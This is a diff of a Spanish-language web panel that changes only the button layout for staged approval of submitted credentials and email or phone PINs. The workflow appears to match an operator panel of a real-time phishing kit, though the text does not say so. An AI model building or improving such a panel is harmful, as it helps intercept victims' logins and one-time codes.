@@ -46,36 +46,36 @@
           pinHTML += ` <span class="text-blue-400 text-sm">(${req.pinTipo === 'correo' ? 'Correo' : 'Teléfono'})</span>`;
         }
 
-        let botones = '';
-                        if (req.estado === 'esperando_aprobacion1') {
+                let botones = '';
+        if (req.estado === 'esperando_aprobacion1') {
           botones = `
-            <div class="flex flex-col sm:flex-row gap-3">
+            <div class="flex flex-wrap gap-3 justify-center">
               <button onclick="aprobarEtapa1('${req.id}')" 
-                      class="px-6 py-3 sm:px-8 sm:py-3 bg-green-600 hover:bg-green-500 rounded-2xl font-medium text-base sm:text-lg flex-1 sm:flex-none">
+                      class="flex-1 sm:flex-none min-w-[140px] px-5 py-3 bg-green-600 hover:bg-green-500 rounded-2xl font-medium text-base">
                 ✅ Aprobar (Etapa 1)
               </button>
               <button onclick="aprobarEtapa1Correo('${req.id}')" 
-                      class="px-6 py-3 sm:px-8 sm:py-3 bg-blue-600 hover:bg-blue-500 rounded-2xl font-medium text-base sm:text-lg flex-1 sm:flex-none">
+                      class="flex-1 sm:flex-none min-w-[140px] px-5 py-3 bg-blue-600 hover:bg-blue-500 rounded-2xl font-medium text-base">
                 ✅ Aprobar PIN Correo
               </button>
               <button onclick="declinarEtapa1('${req.id}')" 
-                      class="px-6 py-3 sm:px-8 sm:py-3 bg-red-600 hover:bg-red-500 rounded-2xl font-medium text-base sm:text-lg flex-1 sm:flex-none">
+                      class="flex-1 sm:flex-none min-w-[140px] px-5 py-3 bg-red-600 hover:bg-red-500 rounded-2xl font-medium text-base">
                 ❌ Credenciales inválidas
               </button>
             </div>`;
-         } else if (req.estado === 'esperando_aprobacion2') {
+        } else if (req.estado === 'esperando_aprobacion2') {
           botones = `
-            <div class="flex flex-col sm:flex-row gap-3">
+            <div class="flex flex-wrap gap-3 justify-center">
               <button onclick="aprobarEtapa2('${req.id}')" 
-                      class="px-6 py-3 sm:px-8 sm:py-3 bg-green-600 hover:bg-green-500 rounded-2xl font-medium text-base sm:text-lg flex-1 sm:flex-none">
+                      class="flex-1 sm:flex-none min-w-[140px] px-5 py-3 bg-green-600 hover:bg-green-500 rounded-2xl font-medium text-base">
                 ✅ Aprobar (Etapa 2)
               </button>
               <button onclick="declinarEtapa2Telefono('${req.id}')" 
-                      class="px-6 py-3 sm:px-8 sm:py-3 bg-red-600 hover:bg-red-500 rounded-2xl font-medium text-base sm:text-lg flex-1 sm:flex-none">
+                      class="flex-1 sm:flex-none min-w-[140px] px-5 py-3 bg-red-600 hover:bg-red-500 rounded-2xl font-medium text-base">
                 ❌ Declinar (Teléfono)
               </button>
               <button onclick="declinarEtapa2Correo('${req.id}')" 
-                      class="px-6 py-3 sm:px-8 sm:py-3 bg-red-600 hover:bg-red-500 rounded-2xl font-medium text-base sm:text-lg flex-1 sm:flex-none">
+                      class="flex-1 sm:flex-none min-w-[140px] px-5 py-3 bg-red-600 hover:bg-red-500 rounded-2xl font-medium text-base">
                 ❌ Declinar (Correo)
               </button>
             </div>`;
